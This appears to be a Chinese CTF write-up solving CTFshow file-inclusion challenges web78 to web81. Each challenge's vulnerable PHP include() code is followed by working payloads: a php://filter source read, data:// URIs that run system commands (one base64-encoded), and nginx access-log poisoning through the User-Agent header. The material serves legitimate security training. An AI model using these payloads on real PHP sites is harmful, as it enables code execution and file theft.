---
title: "CTFshow文件包含"
date: 2022-08-04 14:35:12
---
# web 78

```php
 <?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

## 一.题目分析：

简单的文件包含，没有任何过滤，直接使用伪协议读就行。

## 二.解题思路：

playload:

```plaintext
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

# web 79

```php
 <?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

## 一.题目分析：

替换了php

## 二.解题思路：

构造playload：

```plaintext
?file=data://text/plain,<?= system("cat fla*");?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
```

# web 80-81

```php
 <?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

## 一.题目分析：

过滤了php和data，用日志包含绕过，将执行的命令插入日志中  
 这道题奇怪的是nginx日志在`/var/log/nginx/access.log`，一般apache日志在类似目录下`(/var/log/httpd/access.log)`

日志地址通常为

```plaintext
/var/log/nginx/error.log
/var/log/nginx/access.log
```

## 二.解题思路：

在User-Agent插入  
 `<?php echo system('ls');?>`  
 然后将日志包含进来

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-07173410.png)

直接cat即可得到flag
